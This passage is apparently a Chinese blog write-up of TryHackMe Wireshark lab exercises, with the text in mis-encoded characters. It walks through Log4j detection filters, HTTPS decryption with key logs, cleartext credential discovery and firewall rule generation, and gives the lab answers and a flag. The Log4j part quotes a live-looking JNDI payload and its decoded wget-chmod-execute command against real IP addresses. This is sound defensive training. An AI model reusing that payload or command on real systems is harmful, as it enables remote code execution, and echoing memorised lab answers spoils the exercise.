src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081147138-2135458459.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h5 id=\"log4j-åˆ†æž\">Log4j åˆ†æž</h5>\n<p>ä¸€æ¬¡å…¨é¢çš„è°ƒæŸ¥å§‹äºŽå¯¹å³å°†è¿½è¸ªçš„å¨èƒå’Œå¼‚å¸¸æƒ…å†µè¿›è¡Œé¢„å…ˆç ”ç©¶ã€‚åœ¨å¯åŠ¨ Wireshark ä¹‹å‰ï¼Œè®©æˆ‘ä»¬å…ˆå›žé¡¾ä¸€ä¸‹å…³äºŽâ€œLog4jâ€æ”»å‡»çš„å·²çŸ¥ä¿¡æ¯ã€‚</p>\n<p><strong>Log4jæ¼æ´žåˆ†æžç®€è¿°ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wireshark è¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>æ—¨åœ¨èŽ·å–å”¾æ‰‹å¯å¾—æˆæžœçš„<strong>ç ”ç©¶æˆæžœ ï¼š</strong><br /><br />- æ”»å‡»å§‹äºŽä¸€ä¸ªâ€œPOSTâ€è¯·æ±‚ã€‚<br />- å·²çŸ¥å­˜åœ¨æ˜Žæ–‡æ¨¡å¼ï¼šâ€œ <strong>jndi:ldap</strong> â€å’Œâ€œ <strong>Exploit.class</strong> â€ã€‚</td>\n<td>- <code>http.request.method == \"POST\"</code><br /><br />- <code>(ip contains \"jndi\") or ( ip contains \"Exploit\")</code><br /><br />- <code>(frame contains \"jndi\") or ( frame contains \"Exploit\")</code><br /><br />- <code>(http.user_agent contains \"$\") or (http.user_agent contains \"==\")</code></td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081145469-45977977.png\" /></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>è°ƒæŸ¥ç”¨æˆ·ä»£ç†ã€‚å¼‚å¸¸çš„â€œç”¨æˆ·ä»£ç†â€ç±»åž‹æœ‰å¤šå°‘ç§ï¼Ÿ<br />\nç­›é€‰ï¼š<code>http.user_agent</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/755fb92f9cb7d4cfc93fb92f65398d85.png\" /><br />\næ…¢æ…¢ç¿»æ‰¾ï¼Œå®žé™…ä¸Šæœ‰6ç§ä¸æ˜¯å¸¸è§„çš„uaå¤´<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/2c239b4f5099f5f9bb8198afc1b5a9bb.png\" /></p>\n<pre><code class=\"language-python\">6\n</code></pre>\n<p>ç”¨æˆ·ä»£ç†å­—æ®µä¸­æ‹¼å†™ç•¥æœ‰ä¸åŒçš„æ•°æ®åŒ…ç¼–å·æ˜¯å¤šå°‘ï¼Ÿ<br />\næ³¨æ„çœ‹æ˜¯Mozli å’Œ Mozil çš„åŒºåˆ«<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/d220f05e1ed53710aa3a04097c9823df.png\" /></p>\n<pre><code class=\"language-python\">52\n</code></pre>\n<p>æ‰¾åˆ°â€œLog4jâ€æ”»å‡»çš„èµ·å§‹é˜¶æ®µã€‚æ•°æ®åŒ…ç¼–å·æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>(http.user_agent contains \"$\") or (http.user_agent contains \"==\")</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/8587effc9c8f423cd503d2e89f17766f.png\" /></p>\n<pre><code class=\"language-python\">444\n</code></pre>\n<p>æ‰¾åˆ°â€œLog4jâ€æ”»å‡»çš„èµ·å§‹é˜¶æ®µå¹¶è§£ç base64å‘½ä»¤ã€‚æ”»å‡»è€…è”ç³»çš„IPåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ<br />\nå¤åˆ¶é‚£æ®µbaseå€¼è§£ç <code>${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/f9d65bf950b9bda441b5c17c08a16665.png\" /><br />\n<code>wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh</code></p>\n<pre><code class=\"language-python\">62[.]210[.]130[.]250\n</code></pre>\n<h4 id=\"åŠ å¯†åè®®åˆ†æžè§£å¯†-https\">åŠ å¯†åè®®åˆ†æžï¼šè§£å¯† HTTPS</h4>\n<p>åœ¨è°ƒæŸ¥ç½‘ç»œæµé‡æ—¶ï¼Œåˆ†æžäººå‘˜ç»å¸¸ä¼šé‡åˆ°åŠ å¯†æµé‡ã€‚è¿™æ˜¯å› ä¸ºä¸ºäº†å¢žå¼ºå®‰å…¨æ€§ï¼Œé˜²æ­¢æ¬ºéª—ã€å—…æŽ¢å’Œæ‹¦æˆªæ”»å‡»ï¼Œç½‘ç»œæµé‡é€šå¸¸ä¼šä½¿ç”¨è¶…æ–‡æœ¬ä¼ è¾“â€‹â€‹å®‰å…¨åè®® (HTTPS)ã€‚HTTPS ä½¿ç”¨TLSåè®®å¯¹é€šä¿¡è¿›è¡ŒåŠ å¯†ï¼Œå› æ­¤å¦‚æžœæ²¡æœ‰åŠ å¯†/è§£å¯†å¯†é’¥å¯¹ï¼Œå°±æ— æ³•è§£å¯†æµé‡å¹¶æŸ¥çœ‹ä¼ è¾“çš„æ•°æ®ã€‚ç”±äºŽè¯¥åè®®ä¸ºä¼ è¾“æ•æ„Ÿæ•°æ®æä¾›äº†è‰¯å¥½çš„å®‰å…¨æ€§ï¼Œæ”»å‡»è€…å’Œæ¶æ„ç½‘ç«™ä¹Ÿä¼šä½¿ç”¨ HTTPSã€‚å› æ­¤ï¼Œå®‰å…¨åˆ†æžäººå‘˜åº”è¯¥äº†è§£å¦‚ä½•ä½¿ç”¨å¯†é’¥æ–‡ä»¶æ¥è§£å¯†åŠ å¯†æµé‡å¹¶è°ƒæŸ¥æµé‡æ´»åŠ¨ã€‚</p>\n<p>ç”±äºŽHTTPæµé‡ç»è¿‡åŠ å¯†ï¼Œæ•°æ®åŒ…ä¼šä»¥ä¸åŒçš„é¢œè‰²æ˜¾ç¤ºã€‚æ­¤å¤–ï¼Œåè®®å’Œä¿¡æ¯è¯¦æƒ…ï¼ˆå®žé™… URL åœ°å€å’ŒæœåŠ¡å™¨è¿”å›žçš„æ•°æ®ï¼‰ä¹Ÿä¸ä¼šå®Œå…¨å¯è§ã€‚ä¸‹å›¾æ˜¾ç¤ºäº†ä½¿ç”¨TLSåè®®åŠ å¯†çš„HTTPæ•°æ®åŒ…ã€‚</p>\n<p><strong>å…³äºŽHTTPSçš„è¡¥å……ä¿¡æ¯ï¼š</strong></p>\n<table>\n<thead>\n<tr>\n<th><strong>ç¬”è®°</strong></th>\n<th><strong>Wiresharkè¿‡æ»¤å™¨</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>åˆ©ç”¨â€œHTTPS å‚æ•°â€</strong> è½»æ¾èŽ·å–æˆæžœï¼š<br /><br />- <strong>è¯·æ±‚ï¼š</strong>åˆ—å‡ºæ‰€æœ‰è¯·æ±‚<br />- <strong>TLSï¼š</strong>å…¨å±€TLSæœç´¢<br />- TLSå®¢æˆ·ç«¯è¯·æ±‚<br />- TLSæœåŠ¡å™¨å“åº”<br />- æœ¬åœ°ç®€å•æœåŠ¡å‘çŽ°åè®® (SSDP)<br /><br /><strong>æ³¨ï¼š</strong>  SSDP æ˜¯ä¸€ç§ç½‘ç»œåè®®ï¼Œç”¨äºŽæä¾›ç½‘ç»œæœåŠ¡çš„é€šå‘Šå’Œå‘çŽ°ã€‚</td>\n<td>- <code>http.request</code><br /><br />- <code>tls</code><br /><br />- <code>tls.handshake.type == 1</code><br /><br />- <code>tls.handshake.type == 2</code><br /><br />- <code>ssdp</code></td>\n</tr>\n<tr>\n<td><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/3392862/202512/3392862-20251229081137415-1124783996.png\" /></td>\n<td></td>\n</tr>\n<tr>\n<td>ä¸Ž TCP ä¸‰æ¬¡æ¡æ‰‹è¿‡ç¨‹ç±»ä¼¼ï¼ŒTLS åè®®ä¹Ÿæœ‰è‡ªå·±çš„æ¡æ‰‹è¿‡ç¨‹ã€‚å‰ä¸¤ä¸ªæ­¥éª¤åŒ…å«â€œå®¢æˆ·ç«¯ Helloâ€å’Œâ€œæœåŠ¡å™¨ Helloâ€æ¶ˆæ¯ã€‚æä¾›çš„è¿‡æ»¤å™¨ä¼šæ˜¾ç¤ºæ•èŽ·æ–‡ä»¶ä¸­çš„åˆå§‹ Hello æ•°æ®åŒ…ã€‚è¿™äº›è¿‡æ»¤å™¨æœ‰åŠ©äºŽè¯†åˆ«å‚ä¸Ž TLS æ¡æ‰‹çš„ IP åœ°å€ã€‚</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>Client Helloï¼š<code>(http.request or tls.handshake.type == 1) and !(ssdp)</code></li>\n<li>Server Helloï¼š <code>(http.request or tls.handshake.type == 2) and !(ssdp)</code></li>\n</ul>\n<p><img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/505cf88ff7b555cccf3ea7650b60c107.png\" /></p>\n<p><img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/13aa08663fdf12f8118fb1d38b6a53e9.png\" /></p>\n<p>åŠ å¯†å¯†é’¥æ—¥å¿—æ–‡ä»¶æ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ç”¨äºŽè§£å¯†åŠ å¯†æµé‡ä¼šè¯çš„å”¯ä¸€å¯†é’¥å¯¹ã€‚å½“ä¸Žå¯ç”¨ SSL/ TLSçš„ç½‘é¡µå»ºç«‹è¿žæŽ¥æ—¶ï¼Œè¿™äº›å¯†é’¥å¯¹ä¼šè‡ªåŠ¨åˆ›å»ºï¼ˆæ¯ä¸ªä¼šè¯ä¸€ä¸ªå¯†é’¥å¯¹ï¼‰ã€‚ç”±äºŽè¿™äº›è¿‡ç¨‹éƒ½åœ¨æµè§ˆå™¨ä¸­å®Œæˆï¼Œå› æ­¤æ‚¨éœ€è¦é…ç½®ç³»ç»Ÿå¹¶ä½¿ç”¨åˆé€‚çš„æµè§ˆå™¨ï¼ˆChrome å’Œ Firefox å‡æ”¯æŒæ­¤åŠŸèƒ½ï¼‰å°†è¿™äº›å€¼ä¿å­˜ä¸ºå¯†é’¥æ—¥å¿—æ–‡ä»¶ã€‚ä¸ºæ­¤ï¼Œæ‚¨éœ€è¦è®¾ç½®ä¸€ä¸ªçŽ¯å¢ƒå˜é‡å¹¶åˆ›å»º SSLKEYLOGFILE æ–‡ä»¶ï¼Œæµè§ˆå™¨ä¼šåœ¨æ‚¨æµè§ˆç½‘é¡µæ—¶å°†å¯†é’¥è½¬å‚¨åˆ°æ­¤æ–‡ä»¶ä¸­ã€‚SSL/ TLSå¯†é’¥å¯¹åœ¨è¿žæŽ¥æ—¶ä¸ºæ¯ä¸ªä¼šè¯åˆ›å»ºï¼Œå› æ­¤åœ¨æµé‡æ•èŽ·æœŸé—´è½¬å‚¨å¯†é’¥è‡³å…³é‡è¦ã€‚å¦åˆ™ï¼Œå°†æ— æ³•åˆ›å»º/ç”Ÿæˆåˆé€‚çš„å¯†é’¥æ—¥å¿—æ–‡ä»¶æ¥è§£å¯†æ•èŽ·çš„æµé‡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨â€œå³é”®å•å‡»â€èœå•æˆ– <strong>â€œç¼–è¾‘â€-&gt;â€œé¦–é€‰é¡¹â€-&gt;â€œåè®®â€-&gt; â€œTLS â€</strong> èœå•æ¥æ·»åŠ /åˆ é™¤å¯†é’¥æ—¥å¿—æ–‡ä»¶ã€‚</p>\n<p><strong>ä½¿ç”¨â€œå³é”®å•å‡»â€èœå•æ·»åŠ å…³é”®æ—¥å¿—æ–‡ä»¶ï¼š</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/053a467213a6c280c66a64a56679b22e.gif\" /></p>\n<p><strong>ä½¿ç”¨â€œç¼–è¾‘ --&gt; é¦–é€‰é¡¹ --&gt; åè®® --&gt; TLS â€ æ·»åŠ å…³é”®æ—¥å¿—æ–‡ä»¶</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/49eb7928ec905a40255def63440e5f29.gif\" /></p>\n<p><strong>æŸ¥çœ‹åŒ…å«/ä¸åŒ…å«å…³é”®æ—¥å¿—æ–‡ä»¶çš„æµé‡ï¼š</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/daebaeae0b7f4302ee7b2f8aa42ccdd1.gif\" /></p>\n<p>ä¸Šå›¾æ˜¾ç¤ºï¼Œä½¿ç”¨å¯†é’¥æ—¥å¿—æ–‡ä»¶åŽï¼Œæµé‡è¯¦æƒ…å¯è§ã€‚è¯·æ³¨æ„ï¼Œâ€œæ•°æ®åŒ…è¯¦æƒ…â€å’Œâ€œå­—èŠ‚â€çª—æ ¼ä»¥ä¸åŒæ ¼å¼æä¾›æ•°æ®ä»¥ä¾›åˆ†æžã€‚è§£å¯†æµé‡åŽï¼Œå³å¯æŸ¥çœ‹è§£åŽ‹ç¼©åŽçš„å¤´éƒ¨ä¿¡æ¯å’Œ HTTP/2 æ•°æ®åŒ…è¯¦æƒ…ã€‚æ ¹æ®æ•°æ®åŒ…è¯¦æƒ…çš„ä¸åŒï¼Œæ‚¨è¿˜å¯ä»¥èŽ·å¾—ä»¥ä¸‹æ•°æ®æ ¼å¼ï¼š</p>\n<ul>\n<li>æ¡†æž¶</li>\n<li>å·²è§£å¯†çš„TLS</li>\n<li>è§£åŽ‹ç¼©åŽçš„å¤´éƒ¨</li>\n<li>é‡æ–°ç»„è£…çš„ TCP</li>\n<li>é‡æ–°ç»„è£…çš„ SSL</li>\n</ul>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>å‘é€åˆ°â€œaccounts.google.comâ€çš„â€œClient Helloâ€æ¶ˆæ¯çš„å¸§å·æ˜¯å¤šå°‘ï¼Ÿ<br />\nç­›é€‰ï¼š<code>(http.request or tls.handshake.type == 1) and !(ssdp)</code><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/a8651a913508e9ad16ccc373740aae05.png\" /></p>\n<pre><code class=\"language-python\">16\n</code></pre>\n<p>ä½¿ç”¨â€œKeysLogFile.txtâ€æ–‡ä»¶è§£å¯†æµé‡ã€‚HTTP2æ•°æ®åŒ…çš„æ•°é‡æ˜¯å¤šå°‘ï¼Ÿ<br />\n<strong>â€œEdit â†’ Preferences â†’ Protocols â†’ TLSâ€</strong><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/e6f899ae0ad345b31cafbbd5007d3f8a.png\" /><br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/e028b92cac66aaf1e9ead49b693e621e.png\" /></p>\n<pre><code class=\"language-python\">115\n</code></pre>\n<p>è¯·è½¬åˆ°ç¬¬ 322 å¸§ã€‚HTTP2 æ•°æ®åŒ…çš„æŽˆæƒå¤´éƒ¨æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/92ab5eb265ab721d8459604a4599c9b4.png\" /></p>\n<pre><code class=\"language-python\">safebrowsing[.]googleapis[.]com\n</code></pre>\n<p>ä¿å­˜ä¸€ä¸ªå«flag.txtè¯·æ±‚çš„æ•°æ®åŒ…å³å¯<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/60d45708a6b3d97d17f2cfa81940aac1.png\" /><br />\næ‰“å¼€æ–‡ä»¶<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/ecde8d036395682b954638c699f798d5.png\" /></p>\n<pre><code class=\"language-python\">FLAG{THM-PACKETMASTER}\n</code></pre>\n<h4 id=\"å¥–åŠ±å¯»æ‰¾æ˜Žæ–‡å‡­è¯\">å¥–åŠ±ï¼šå¯»æ‰¾æ˜Žæ–‡å‡­è¯ï¼</h4>\n<p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬è®¨è®ºäº†å¦‚ä½•æ£€æŸ¥æ•°æ®åŒ…æ˜¯å¦å­˜åœ¨ç‰¹å®šæƒ…å†µå¹¶å‘çŽ°å¼‚å¸¸ã€‚æ­£å¦‚ç¬¬ä¸€é—´ä¼šè®®å®¤æåˆ°çš„ï¼ŒWireshark å¹¶éžå…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS)ï¼Œä½†å®ƒä¼šåœ¨ä¸“å®¶ä¿¡æ¯ä¸­é’ˆå¯¹æŸäº›æƒ…å†µæä¾›å»ºè®®ã€‚ç„¶è€Œï¼Œæœ‰æ—¶å¼‚å¸¸æµé‡ä¼šä¼ªè£…æˆæ­£å¸¸æµé‡ï¼Œè¿™ä½¿å¾—æ£€æµ‹å˜å¾—æ›´åŠ å›°éš¾ã€‚ä¾‹å¦‚ï¼Œåœ¨æ˜Žæ–‡å‡­æ®æ”»å‡»æ¡ˆä¾‹ä¸­ï¼Œå¾ˆéš¾å‘çŽ°å¤šä¸ªå‡­æ®è¾“å…¥ï¼Œä¹Ÿéš¾ä»¥åˆ¤æ–­è¿™æ˜¯æš´åŠ›ç ´è§£æ”»å‡»è¿˜æ˜¯æ™®é€šç”¨æˆ·è¯¯è¾“äº†å‡­æ®ã€‚</p>\n<p>ç”±äºŽæ‰€æœ‰ä¿¡æ¯éƒ½ä»¥æ•°æ®åŒ…çš„å½¢å¼å‘ˆçŽ°ï¼Œå› æ­¤å¾ˆéš¾ä¸€çœ¼çœ‹å‡ºå¤šä¸ªç”¨æˆ·å/å¯†ç æ¡ç›®ã€‚å¦‚æžœåˆ†æžäººå‘˜èƒ½å¤Ÿä»¥åˆ—è¡¨å½¢å¼æŸ¥çœ‹å‡­æ®æ¡ç›®ï¼Œæ£€æµ‹æ—¶é—´å°†ä¼šç¼©çŸ­ã€‚Wireshark å…·å¤‡è¿™æ ·çš„åŠŸèƒ½ï¼Œå¯ä»¥å¸®åŠ©åˆ†æžäººå‘˜æŸ¥æ‰¾æ˜Žæ–‡å‡­æ®æ¡ç›®ã€‚</p>\n<p>éƒ¨åˆ† Wireshark æ•°æ®åŒ…åˆ†æžå™¨ï¼ˆFTPã€HTTPã€IMAPã€POP å’ŒSMTPï¼‰å¯ä»¥æå–æ•èŽ·æ–‡ä»¶ä¸­çš„æ˜Žæ–‡å¯†ç ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œå·¥å…· --&gt; å‡­æ®â€</strong> èœå•æŸ¥çœ‹æ£€æµ‹åˆ°çš„å‡­æ®ã€‚æ­¤åŠŸèƒ½ä»…é€‚ç”¨äºŽç‰¹å®šç‰ˆæœ¬çš„ Wiresharkï¼ˆv3.1 åŠæ›´é«˜ç‰ˆæœ¬ï¼‰ã€‚ç”±äºŽè¯¥åŠŸèƒ½ä»…é€‚ç”¨äºŽç‰¹å®šåè®®ï¼Œå› æ­¤å»ºè®®è¿›è¡Œæ‰‹åŠ¨æ£€æŸ¥ï¼Œä¸è¦å®Œå…¨ä¾èµ–æ­¤åŠŸèƒ½æ¥åˆ¤æ–­æµé‡ä¸­æ˜¯å¦å­˜åœ¨æ˜Žæ–‡å‡­æ®ã€‚</p>\n<p>ä½¿ç”¨è¯¥åŠŸèƒ½åŽï¼Œå®ƒä¼šæ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œæ˜¾ç¤ºæ£€æµ‹åˆ°çš„å‡­æ®ã€‚çª—å£ä¼šæ˜¾ç¤ºæ•°æ®åŒ…ç¼–å·ã€åè®®ã€ç”¨æˆ·åå’Œå…¶ä»–ä¿¡æ¯ã€‚æ­¤çª—å£å¯ç‚¹å‡»ï¼›ç‚¹å‡»æ•°æ®åŒ…ç¼–å·å°†é€‰æ‹©åŒ…å«å¯†ç çš„æ•°æ®åŒ…ï¼Œç‚¹å‡»ç”¨æˆ·åå°†é€‰æ‹©åŒ…å«ç”¨æˆ·åä¿¡æ¯çš„æ•°æ®åŒ…ã€‚â€œå…¶ä»–ä¿¡æ¯â€éƒ¨åˆ†ä¼šæç¤ºåŒ…å«ç”¨æˆ·åçš„æ•°æ®åŒ…ç¼–å·ã€‚</p>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/4666a693678694cc012741294bde0bee.png\" /></p>\n<p>è¿™ä¸ªå·¥å…·å¤ªå±Œäº†ï¼</p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>ä½¿ç”¨â€œHTTP åŸºæœ¬èº«ä»½éªŒè¯â€æ—¶ï¼Œå‡­æ®çš„æ•°æ®åŒ…ç¼–å·æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/6fdaf470f8bd969a60ff6d19a89dc85c.png\" /></p>\n<pre><code class=\"language-python\">237\n</code></pre>\n<p>æäº¤â€œç©ºå¯†ç â€çš„æ•°æ®åŒ…ç¼–å·æ˜¯å¤šå°‘ï¼Ÿ<br />\n<img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/e974bec189785cf99469630366381c82.png\" /></p>\n<pre><code class=\"language-python\">170\n</code></pre>\n<h4 id=\"é¢å¤–ç¦åˆ©å¯æ‰§è¡Œçš„ç»“æžœ\">é¢å¤–ç¦åˆ©ï¼šå¯æ‰§è¡Œçš„ç»“æžœï¼</h4>\n<p>æ‚¨å·²è°ƒæŸ¥äº†ç½‘ç»œæµé‡ï¼Œæ£€æµ‹åˆ°äº†å¼‚å¸¸æƒ…å†µï¼Œå¹¶åˆ›å»ºäº†ç¬”è®°ä»¥ä¾›è¿›ä¸€æ­¥è°ƒæŸ¥ã€‚æŽ¥ä¸‹æ¥è¯¥åšä»€ä¹ˆï¼Ÿå¹¶éžæ‰€æœ‰æ¡ˆä¾‹è°ƒæŸ¥éƒ½ç”±å›¢é˜Ÿåä½œå®Œæˆã€‚ä½œä¸ºå®‰å…¨åˆ†æžå¸ˆï¼Œæœ‰äº›æƒ…å†µä¸‹æ‚¨éœ€è¦è‡ªè¡Œå‘çŽ°å¼‚å¸¸ã€ç¡®å®šæºå¤´å¹¶é‡‡å–è¡ŒåŠ¨ã€‚<br />\nWireshark çš„åŠŸèƒ½ä¸ä»…é™äºŽæ•°æ®åŒ…ç»†èŠ‚ï¼›å®ƒè¿˜å¯ä»¥å¸®åŠ©æ‚¨åˆ›å»ºé˜²ç«å¢™è§„åˆ™ï¼Œåªéœ€ç‚¹å‡»å‡ ä¸‹å³å¯å®žæ–½ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ <strong>â€œå·¥å…· --&gt;</strong> <strong>é˜²ç«å¢™<strong><strong>ACL</strong></strong>è§„åˆ™â€èœå•åˆ›å»º</strong>é˜²ç«å¢™è§„åˆ™ ã€‚ä½¿ç”¨æ­¤åŠŸèƒ½åŽï¼Œå®ƒå°†æ‰“å¼€ä¸€ä¸ªæ–°çª—å£ï¼Œå¹¶æä¾›ä¸€ç³»åˆ—è§„åˆ™ï¼ˆåŸºäºŽ IPã€ç«¯å£å’Œ MAC åœ°å€ï¼‰ï¼Œä»¥æ»¡è¶³ä¸åŒçš„éœ€æ±‚ã€‚è¯·æ³¨æ„ï¼Œè¿™äº›è§„åˆ™æ˜¯ä¸ºåœ¨å¤–éƒ¨é˜²ç«å¢™æŽ¥å£ä¸Šå®žæ–½è€Œç”Ÿæˆçš„ã€‚</p>\n<p>ç›®å‰ï¼ŒWireshark å¯ä»¥åˆ›å»ºä»¥ä¸‹è§„åˆ™ï¼š</p>\n<ul>\n<li>Netfilterï¼ˆiptablesï¼‰</li>\n<li>Cisco IOSï¼ˆæ ‡å‡†ç‰ˆ/æ‰©å±•ç‰ˆï¼‰</li>\n<li>IPè¿‡æ»¤å™¨ï¼ˆipfilterï¼‰</li>\n<li>IPé˜²ç«å¢™ï¼ˆipfwï¼‰</li>\n<li>æ•°æ®åŒ…è¿‡æ»¤å™¨ï¼ˆpfï¼‰</li>\n<li>Windowsé˜²ç«å¢™ï¼ˆnetsh æ–°/æ—§æ ¼å¼ï¼‰</li>\n</ul>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/f161b25dca3abf5fbdeea5781dbd718d.png\" /></p>\n<hr />\n<p>è¯·å›žç­”ä»¥ä¸‹é—®é¢˜</p>\n<p>é€‰æ‹©æ•°æ®åŒ…ç¼–å·99ï¼Œç„¶åŽç‚¹å¼€â€œIPFirewall (ipfw)â€ï¼Œæ‰¾åˆ°è¿™æ¡â€œæ‹’ç»denyæºIPv4åœ°å€â€çš„è§„åˆ™ï¼Œçœ‹ä»–å†™çš„æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/20cc86aa3cef0c9196a862b68ef40a66.png\" /></p>\n<pre><code class=\"language-python\">add deny ip from 10.121.70.151 to any in\n</code></pre>\n<p>é€‰æ‹©æ•°æ®åŒ…ç¼–å· 23ï¼Œç„¶åŽç‚¹å¼€â€œIPFirewallâ€è§„åˆ™ï¼Œçœ‹ä¸‹å…è®¸allowç›®æ ‡ MAC åœ°å€çš„è§„åˆ™æ˜¯ä»€ä¹ˆï¼Ÿ<br />\n<img alt=\"500\" src=\"https://i-blog.csdnimg.cn/img_convert/787073e08609ee5ac2814c8f0cc85ff6.png\" /></p>\n<pre><code class=\"language-python\">add allow MAC 00:d0:59:aa:af:80 any in\n</code></pre>\n<h4 id=\"ç»“è®º\">ç»“è®º</h4>\n<p>Wireshark æ˜¯å¼€å±•ç½‘ç»œå®‰å…¨è°ƒæŸ¥çš„ä¼˜ç§€å·¥å…·ã€‚ç„¶è€Œï¼Œå®ƒä¸è¶³ä»¥é˜»æ­¢å¨èƒã€‚å®‰å…¨åˆ†æžå¸ˆåº”å…·å¤‡å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ (IDS) /å…¥ä¾µé˜²å¾¡ç³»ç»Ÿ(IPS) çš„çŸ¥è¯†ä»¥åŠå…¶ä»–å·¥å…·çš„ä½¿ç”¨æŠ€èƒ½ï¼Œæ‰èƒ½æ£€æµ‹å’Œé¢„é˜²å¼‚å¸¸åŠå¨èƒã€‚éšç€æ”»å‡»æ‰‹æ®µæ—¥ç›Šå¤æ‚ï¼Œä½¿ç”¨å¤šç§å·¥å…·å’Œæ£€æµ‹ç­–ç•¥å·²æˆä¸ºå¿…è¦ã€‚</p>\n<h3 id=\"ç½‘ç»œçŸ¿å·¥\">ç½‘ç»œçŸ¿å·¥</h3>\n<p>å­¦ä¹ å¦‚ä½•ä½¿ç”¨ NetworkMiner åˆ†æžè®°å½•çš„æµé‡æ–‡ä»¶å¹¶è¿›è¡Œç½‘ç»œå–è¯æ´»åŠ¨ã€‚</p>\n<h4 id=\"ä»‹ç»-3\">ä»‹ç»</h4>\n<p><img alt=\"\" src=\"https://i-blog.csdnimg.cn/img_convert/273bc41b58f1230d1cdad7626f34f4ba.png\" /></p>\n<p>NetworkMineræ˜¯ä¸€æ¬¾å¼€æºçš„æµé‡å—…æŽ¢å™¨ã€PCAPå¤„ç†ç¨‹åºå’Œåè®®åˆ†æžå™¨ï¼Œç”±Netresecå¼€å‘å¹¶æŒç»­ç»´æŠ¤ã€‚<br />\n<a href=\"https://www.netresec.com/?page=NetworkMiner\" rel=\"noopener nofollow\" target=\"_blank\">å®˜æ–¹æè¿°ï¼š</a><br />\nNetworkMiner æ˜¯ä¸€æ¬¾é€‚ç”¨äºŽ Windows çš„å¼€æºç½‘ç»œå–è¯åˆ†æžå·¥å…· ( NFAT )ï¼ˆä¹Ÿæ”¯æŒLinuxã€Mac OS X å’Œ FreeBSDï¼‰ã€‚NetworkMiner å¯ç”¨ä½œè¢«åŠ¨å¼ç½‘ç»œå—…æŽ¢å™¨/æ•°æ®åŒ…æ•èŽ·å·¥å…·ï¼Œæ— éœ€åœ¨ç½‘ç»œä¸ŠæŠ•æ”¾ä»»ä½•æµé‡å³å¯æ£€æµ‹æ“ä½œç³»ç»Ÿã€ä¼šè¯ã€ä¸»æœºåã€å¼€æ”¾ç«¯å£ç­‰ä¿¡æ¯ã€‚NetworkMiner è¿˜å¯ä»¥è§£æžPCAPæ–‡ä»¶ä»¥è¿›è¡Œç¦»çº¿åˆ†æžï¼Œå¹¶ä»ŽPCAPæ–‡ä»¶ä¸­é‡æ–°ç”Ÿæˆ/ç»„è£…ä¼ è¾“çš„æ–‡ä»¶å’Œè¯ä¹¦ã€‚</p>\n<p>è‡ª2007å¹´é¦–æ¬¡å‘å¸ƒä»¥æ¥ï¼ŒNetworkMinerå·²æˆä¸ºäº‹ä»¶å“åº”å›¢é˜Ÿå’Œæ‰§æ³•éƒ¨é—¨çš„çƒ­é—¨å·¥å…·ã€‚å¦‚ä»Šï¼Œä¸–ç•Œå„åœ°çš„å…¬å¸å’Œç»„ç»‡éƒ½åœ¨ä½¿ç”¨NetworkMinerã€‚</p>\n<p>æœ¬æˆ¿é—´æ—¨åœ¨æä¾›ç½‘ç»œå–è¯çš„ä¸€èˆ¬æ¦‚è¿°ï¼Œå¹¶ä½¿ç”¨ NetworkMiner 